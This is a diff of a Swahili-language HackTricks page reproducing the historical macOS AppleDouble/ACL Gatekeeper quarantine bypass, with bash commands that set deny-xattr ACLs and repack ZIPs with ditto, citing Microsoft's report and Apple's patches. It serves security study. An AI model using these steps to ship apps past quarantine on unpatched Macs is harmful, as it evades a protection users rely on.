@@ -1,12 +1,71 @@
-# mambo ya ziada ya macOS xattr-acls
+# Uzalishaji Upya wa AppleDouble ACL Quarantine Bypass
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Proof of concept hii ya kihistoria inaunda upya mbinu ya AppleDouble/ACL iliyotumiwa katika utafiti wa kukwepa Achilles Gatekeeper. Huserializa ACL, huihifadhi kwenye faili saidizi ya AppleDouble, hubadilisha jina la attribute kuwa `com.apple.acl.text`, kisha huunda upya ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
+Uthibitisho huu wa kihistoria wa dhana unaiga mbinu ya AppleDouble/ACL iliyotumiwa katika utafiti wa Achilles Gatekeeper bypass. Huserialize ACL, huihifadhi katika AppleDouble sidecar, hubadilisha jina la attribute kuwa `com.apple.acl.text`, kisha hupakia upya ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple ilirekebisha ukwepaji wa Gatekeeper katika macOS Ventura 13, Monterey 12.6.2, na Big Sur 11.7.2; kurejesha ACL kwenye Mac ya sasa hakuonyeshi kuwa kuna ukwepaji wa Gatekeeper unaofanya kazi.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple ilirekebisha Gatekeeper bypass katika macOS Ventura 13, Monterey 12.6.2, na Big Sur 11.7.2; kurejesha ACL kwenye Mac ya sasa hakuthibitishi kuwa Gatekeeper bypass inafanya kazi.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
-Kwa ukaguzi wa quarantine na uzinduzi wa kwanza, angalia [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+Kwa ukaguzi wa quarantine na wa uzinduzi wa kwanza, tazama [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+
+## Tabia ya mfumo wa faili ya ACL na AppleDouble
+
+### writeextattr ACL
+
+ACL hii huzuia kuongeza `xattrs` kwenye faili.
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+Umbizo la faili la **AppleDouble** hunakili faili pamoja na ACE zake.
+
+Katika [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), inawezekana kuona kwamba uwakilishi wa maandishi wa ACL uliohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL kwenye faili iliyofunguliwa kutoka kwenye archive. Kwa hiyo, ukibana programu kwenye faili ya zip kwa kutumia umbizo la faili la **AppleDouble** na ACL inayozuia xattr nyingine kuandikwa humo... xattr ya quarantine haikuwekwa kwenye programu:
+
+Angalia [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.<sup>[[1]](#references)</sup>
+
+Ili kurudia hili, kwanza tunahitaji kupata mfuatano sahihi wa ACL:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(Kumbuka kwamba hata kama hii itafanya kazi, sandbox huandika xattr ya quarantine mapema.)
+
+## Ujenzi na uthibitishaji wa sidecar ya AppleDouble
 
 ```bash
 rm -rf /tmp/test*
@@ -191,8 +250,8 @@ xattr -p com.apple.quarantine protected
 
 ## References
 
-- [1] [Blogu ya Usalama ya Microsoft — Kisigino cha Achilles cha Gatekeeper: Kufichua udhaifu wa macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
-- [2] [Apple Developer — Kufunga programu za Mac kwa usambazaji kwa kutumia `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
+- [1] [Microsoft Security Blog — Udhaifu wa Gatekeeper: Kufichua udhaifu wa macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [2] [Apple Developer — Kufungasha programu za Mac kwa usambazaji kwa kutumia `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
 - [3] [Apple Support — Kuhusu maudhui ya usalama ya macOS Ventura 13](https://support.apple.com/en-ae/102853)
 - [4] [Apple Support — Kuhusu maudhui ya usalama ya macOS Monterey 12.6.2](https://support.apple.com/en-ae/102806)
 - [5] [Apple Support — Kuhusu maudhui ya usalama ya macOS Big Sur 11.7.2](https://support.apple.com/en-us/102785)
